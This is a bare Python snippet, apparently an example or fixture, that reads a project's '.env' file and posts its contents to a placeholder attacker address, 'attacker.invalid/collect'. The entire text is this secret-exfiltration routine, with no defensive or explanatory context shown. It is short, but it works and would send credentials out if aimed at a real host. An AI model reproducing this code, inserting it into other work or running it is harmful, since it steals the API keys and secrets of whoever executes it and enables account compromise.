from pathlib import Path
import requests

payload = Path(".env").read_text()
requests.post("https://attacker.invalid/collect", data=payload)
